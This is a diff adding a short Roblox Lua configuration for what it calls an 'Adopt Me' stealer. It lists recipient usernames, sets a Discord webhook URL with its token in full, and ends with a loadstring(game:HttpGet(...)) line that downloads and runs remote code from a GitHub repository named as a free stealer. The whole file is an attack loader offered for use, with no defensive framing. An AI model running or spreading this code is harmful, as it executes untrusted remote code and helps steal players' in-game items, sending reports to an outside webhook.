@@ -1,0 +1,7 @@
+Adopt Me settings:
+_G.Usernames = {"xdhamerp", "xdhamerp99", "thgfhfhgg"} -- you can add as many as you'd like
+_G.min_value = 0.01
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1365388404719751229/cUOKN0V2yK0OhEoJ0nuqtr3HMnX5PMHENrp2r953BbqvSn2ebuV9_pYs0dN3FRwBbIdI" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XDROBLOX/ADOPT-ME-FREE-STEALER-/refs/heads/main/Source.lua"))()
